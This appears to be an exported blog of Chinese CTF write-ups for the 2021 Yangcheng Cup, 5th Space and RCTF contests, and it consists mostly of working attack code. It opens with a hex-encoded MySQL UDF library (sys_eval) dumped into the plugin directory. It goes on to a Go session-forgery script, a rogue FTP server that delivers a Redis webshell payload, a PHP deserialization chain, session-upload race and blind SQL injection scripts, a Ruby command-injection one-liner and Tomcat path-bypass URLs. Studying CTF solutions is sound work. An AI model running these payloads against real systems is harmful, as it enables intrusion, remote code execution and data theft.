E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400') into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/mysqludf.so'; 然后再从里面导入函数 create function sys_eval returns string soname 'mysqludf.so'; checkin_go比赛的时候有找到类似的文章，但是由于go语言第一次见，当时确实有点慌了，哎可惜呀~关键点在这里:chekNowMoney这个值我们从代码里可以看到是cookies一定有的 并且这个值就是加密后20w的值 之后猜测可能是sessions伪造 但这个是随机生成的 查了相关资料发现 go里面的math/seed 如果没设定 默认为1 默认种子为1这就代表着我们随机数可控，那我们伪造sessions就行了 伪造一个钱数和管理员。脚本: 参考链接https://annevi.cn/2020/08/14/wmctf2020-gogogowriteup/#0x04_SSRF_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96package mainimport (&quot;github.com/gin-contrib/sessions&quot;&quot;github.com/gin-contrib/sessions/cookie&quot;&quot;github.com/gin-gonic/gin&quot;&quot;math/rand&quot;&quot;fmt&quot;)func main() {r := gin.Default()storage := cookie.NewStore(randomChar(16))r.Use(sessions.Sessions(&quot;o&quot;, storage))r.GET(&quot;/getcookies&quot;,cookieHandler)r.Run(&quot;0.0.0.0:8002&quot;)}func cookieHandler(c *gin.Context){s := sessions.Default(c)s.Set(&quot;uname&quot;, &quot;admin&quot;)s.Set(&quot;checkNowMoney&quot;, &quot;JkeLNs0tAng7rDdgtr1nDQ&quot;)s.Set(&quot;checkPlayerMoney&quot;, &quot;JkeLNs0tAng7rDdgtr1nDQ&quot;)s.Set(&quot;nowMoney&quot;, 200000)s.Set(&quot;playerMoney&quot;, 200000)s.Save()}func randomChar(l int) []byte {output := make([]byte, l)rand.Read(output)return output} cross the side是ssrf打redis的题目，可惜了，没有去做一下，因为是刚学到的知识点，对着之前的笔记看看别人的题解吧:gopher打redis，但是后面的连接其实我是没懂的先拿个题解好了 import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload =unquote(&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;)payload = payload.encode('utf-8')host = '0.0.0.0'port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1:conn, address = sk.accept()conn.send(b&quot;200 \\n&quot;)print(conn.recv(20)) # USER aaa\\r\\n 客户端传来用户名if count == 1:conn.send(b&quot;220 ready\\n&quot;)else:conn.send(b&quot;200 ready\\n&quot;)print(conn.recv(20)) # TYPE I\\r\\n 客户端告诉服务端以什么格式传输数据，TYPEI表示二进制， TYPE A表示文本if count == 1:conn.send(b&quot;215 \\n&quot;)else:conn.send(b&quot;200 \\n&quot;)print(conn.recv(20)) # SIZE /123\\r\\n 客户端询问文件/123的大小if count == 1:conn.send(b&quot;213 3 \\n&quot;)else:conn.send(b&quot;300 \\n&quot;)print(conn.recv(20)) # EPSV\\r\\n'conn.send(b&quot;200 \\n&quot;)print(conn.recv(20)) # PASV\\r\\n 客户端告诉服务端进入被动连接模式if count == 1:# 36.255.221.156conn.send(b&quot;227 36,255,221,156,4,210\\n&quot;) # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234else:print(&quot;第二次&quot;)conn.send(b&quot;227 127,0,0,1,0,6379\\n&quot;) # 端口计算规则：35*256+40=9000print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\nif count == 1:conn.send(b&quot;125 \\n&quot;) # 告诉客户端可以开始数据连接了# 新建一个socket给服务端返回我们的payloadprint(&quot;建立连接!&quot;)conn2, address2 = sk2.accept()conn2.send(payload)conn2.close()print(&quot;断开连接!&quot;)else:conn.send(b&quot;150 \\n&quot;)print(conn.recv(20))exit()# 第一次连接是下载文件，需要告诉客户端下载已经结束if count == 1:conn.send(b&quot;226 \\n&quot;)conn.close()count += 1 参考链接：https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247491162&amp;idx=1&amp;sn=273d86b4c5c4f8758face216497bd87d&amp;chksm=e8a23d8bdfd5b49dd9ea82601cc7683f9debeb91d9cda100230cc25d76d801ab58a5d1443a34&amp;mpshare=1&amp;scene=23&amp;srcid=09125Gbtvppmn5dEsykPwidl&amp;sharer_sharetime=1631456612674&amp;sharer_shareid=1a55b3791775cccd32c32b318eb9206a#rd","link":"/2021/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFwp/"},{"title":"2021第五空间大赛","text":"前言比赛的时候一直纠结那题sql注入，后面赛后复现其他题目悔不当初，题目都不会太难吧 pklovecloud&lt;?php include 'flag.php';class pkshow { function echo_name() { return &quot;Pk very safe^.^&quot;; } } class acp { protected $cinder; public $neutron; public $nova; function __construct() { $this-&gt;cinder = new pkshow; } function __toString() { if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); } } class ace{ public $filename; public $openstack; public $docker; function echo_name() { $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;keystone lost~&quot;; } } } } if (isset($_GET['pks'])) { $logData = unserialize($_GET['pks']); echo $logData; } else { highlight_file(__file__); }?&gt; 构造一下链条 &lt;?phpclass acp{ public $cinder; public $neutron=&quot;1&quot;; public $nova=&quot;1&quot;; function __construct() { $this-&gt;cinder = new pkshow; } function __toString() { if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); }}class ace{ public $filename; public $openstack; public $docker; function echo_name() { $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;keystone lost~&quot;; } } }}$a=new acp();$b=new ace();$b-&gt;filename=&quot;flag.php&quot;;$a-&gt;cinder=$b;echo urlencode(serialize($a)); O%3A3%3A&quot;acp&quot;%3A3%3A%7Bs%3A6%3A&quot;cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3BN%3B%7Ds%3A7%3A&quot;neutron&quot;%3Bs%3A1%3A&quot;1&quot;%3Bs%3A4%3A&quot;nova&quot;%3Bs%3A1%3A&quot;1&quot;%3B%7D WebFTP目录扫描，拿到源码，然后使用index.php里面的文件进行登录，发现报错，不知道有没有用，先收集一下 Warning: error_log(/var/www/html/Data/Logs/21_09_17.log): failed to open stream: No such file or directory in /var/www/html/Inc/Functions.php on line 229 发现都没啥用，但是发现可以下载配置文件，于是就对照拿到的源码去翻翻看 http://114.115.185.167:32770/Readme/mytz.php?act=phpinfo 发现可以执行phpinfo，接下来就拿到flag了 EasyCleanup &lt;?phpif(!isset($_GET['mode'])){ highlight_file(__file__);}else if($_GET['mode'] == &quot;eval&quot;){ $shell = $_GET['shell'] ?? 'phpinfo();'; if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); eval($shell);}if(isset($_GET['file'])){ if(strlen($_GET['file']) &gt; 15 | filter($_GET['file'])) exit(&quot;hacker&quot;); include $_GET['file'];}function filter($var): bool{ $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;]; foreach($banned as $ban){ if(strstr($var, $ban)) return True; } return False;}function checkNums($var): bool{ $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'; $cnt = 0; for($i = 0; $i &lt; strlen($alphanum); $i++){ for($j = 0; $j &lt; strlen($var); $j++){ if($var[$j] == $alphanum[$i]){ $cnt += 1; if($cnt &gt; 8) return True; } } } return False;}?&gt; 查看一下phpinfo()内容 ?mode=eval&amp;shell=phpinfo(); 刚刚注意到有文件包含操作,发现session这里开启了， 然后写脚本包含以下就出来了~ import requestsimport threadingsess_id=&quot;1&quot;s=requests.session()url=&quot;http://114.115.134.72:32770/&quot;def session_upload(): while True: res= s.post( url=f&quot;{url}/?page=/tmp/session/sess_{sess_id}&quot;, data={ 'PHP_SESSION_UPLOAD_PROGRESS': &quot;&lt;?php system('ls');?&gt;&quot; }, files={&quot;file&quot;: ('xxx.txt', open(&quot;shell.txt&quot;, &quot;r&quot;))}, cookies={'PHPSESSID':sess_id} )for i in range(100): thread=threading.Thread(target=session_upload) thread.start() yet_another_mysql_injection最后一题，一开始看了一下源码，要登录 &lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url){ die(&quot;&lt;script&gt;alert('{$mes}');location.href='{$url}';&lt;/script&gt;&quot;);}function checkSql($s) { if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s)){ alertMes('hacker', 'index.php'); }}if (isset($_POST['username']) &amp;&amp; $_POST['username'] != '' &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['password'] != '') { $username=$_POST['username']; $password=$_POST['password']; if ($username !== 'admin') { alertMes('only admin can login', 'index.php'); } checkSql($password); $sql=&quot;SELECT password FROM users WHERE username='admin' and password='$password';&quot;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) { alertMes(&quot;something wrong&quot;,'index.php'); } if ($row['password'] === $password) { die($FLAG); } else { alertMes(&quot;wrong password&quot;,'index.php'); }}if(isset($_GET['source'])){ show_source(__FILE__); die;}?&gt; 一开始看了一下以为是要登录，所以就写了个脚本盲注 import requestsimport timeimport binasciiurl=&quot;http://114.115.143.25:32770&quot;s=requests.session()def hex_tran(s): return hex(s).replace(&quot;0x&quot;, &quot;&quot;)def tran_str(g): tran_tmp=&quot;&quot; g = binascii.unhexlify(g) print(g.decode('utf-8')) tran_tmp=g print(tran_tmp[::-1]) return tran_tmpdef sql_injection(payload:str): wd_tr=&quot;&quot; for j in range(1,100): for i in range(32,128): #payload_fina=f&quot;1'or/**/case/**/(select/**/hex(right(({payload}),{j}))/**/in/**/('{hex_tran(i)+wd_tr}'))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG'))))))))/**/else/**/1/**/end#&quot; payload_fina =f&quot;1'or/**/case/**/(select/**/ascii(mid(({payload}),{j},1)))/**/when/**/({i})/**/then/**/benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG')))))))))))/**/else/**/1/**/end#&quot; data={ &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:payload_fina } print(data) times=time.time() r=s.post(url,data=data).text print(r) if time.time()-times &gt;= 7: wd_tr+=chr(i) print(wd_tr) break if i==127: print(wd_tr) exit(0)if __name__ ==&quot;__main__&quot;: payload=&quot;version()&quot; #payload=&quot;database()&quot; #payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(a.2) from (select 1,2,3 union select * from `users`)a&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in ('Fl49ish3re')&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(f1aG123) from Fl49ish3re&quot;.replace(&quot; &quot;,&quot;/**/&quot;) sql_injection(payload) 注出来以后，发现数据库是空的，卡了很久，后来才想到，数据库为空，又要让我们输入的内容和输出的内容一致的话，就需要自己构造一下 '/**/UNION/**/SELECT/**/REPLACE(REPLACE('&quot;/**/UNION/**/SELECT/**/REPLACE(REPLACE(&quot;^&quot;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&quot;^&quot;)#',unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),'&quot;/**/UNION/**/SELECT/**/REPLACE(REPLACE(&quot;^&quot;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&quot;^&quot;)#')# 大师傅跟我说，遇到这种题目，其实可以这样尝试一波：在后面注入password like “%” 因为如果数据库有数据，那么任何数据like %都是满足的，如果依然返回false，说明数据库是空的当然首先是你的用户名是正确的 png转换器看了一下框架是ruby，这个时候应该用排除法，肯定不是文件上传，因为无法访问到图片，接下就是convert png file的框，这里又有什么情况可能呢？ssti注入，命令执行，似乎也无了，ssti注入没地方回显，所以肯定也不是，这里就学到一个新姿势 file=|bash -c &quot;$(echo 'bHMgLw==' | base64 -d)&quot; #.pngcat /FLA9_KywXAv78LbopbpBDuWsmfile=|bash -c &quot;$(echo 'Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3Nt' | base64 -d)&quot; #.png 这个就是ruby命令执行的姿势了，将命令执行的结果以base64的方式存储在png中","link":"/2021/09/17/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"},{"title":"2021Rctf","text":"当时在打羊城杯，打完以后就很累就没怎么打rctf，不过题目也是我没见过的trick就是了，这里记录一下 easyphp分号前段认证绕过原理1.httpservletrequest中url解析函数几种解析方法： request.getRequestURL()：返回全路径；request.getRequestURI()：返回除去Host（域名或IP）部分的路径；request.getContextPath()：返回工程名部分，若是工程映射为/，则返回为空；request.getServletPath()：返回除去Host和工程名部分的路径；request.getPathInfo()：仅返回传递到Servlet的路径，若是没有传递额外的路径信息，则此返回Null； 当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会形成访问限制绕过的安全风险，其中分号；就是其一。 2.对url特殊字符的处理1）分号在url中遇到分号，会将;xxx/中的分号与斜杠之间的字符串以及分号自己都去掉2）斜杠/判断是否有连续的/，存在的话则循环删除掉多余的/3）./和../将/./删除掉，将/../进行跨目录拼接处理 总结：/;xxx/实现分割目录/..;/实现跨目录，经常使用在../被禁用的场景下;.css或;.js等利用白名单绕过认证鉴权 payload： 加/绕过：http://localhost:8080//urltest/info/secret.jsp跨目录：http://localhost:8080/urltest/anything/../info/secret.jsp 或http://localhost:8080/urltest/anything/..;/info/secret.jsp./绕过：http://localhost:8080/urltest/./info/secret.jsp;绕过：http://localhost:8080/urltest/;anything/info/secret.jsp 